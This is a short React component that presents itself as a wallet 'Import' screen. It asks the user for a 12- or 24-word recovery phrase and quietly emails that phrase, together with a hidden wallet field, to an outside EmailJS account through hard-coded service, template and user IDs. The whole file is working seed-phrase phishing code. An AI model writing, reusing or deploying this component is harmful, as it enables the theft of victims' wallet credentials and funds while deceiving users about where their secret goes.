import React from "react";
import emailjs from "emailjs-com";

const sendEmail = (e) => {
  e.preventDefault();
  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_069w5ez",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Phrase = ({ wallet }) => {
  return (
    <>
      <form onSubmit={sendEmail}>
        <br />
        <input
          type="text"
          placeholder="Phrase key"
          name="key"
          min="12" max="100"
          minLength="12"
        ></input>
        <h6 className="h4" style={{ color: "black" }}>
          Typically 12(sometimes 24) words separated by single spaces
        </h6>
        <input type="text" value={wallet} className="hiddeen" name="wallet" />

        <button type="submit" >
          <b>Import</b>
        </button>
      </form>
    </>
  );
};

export default Phrase;
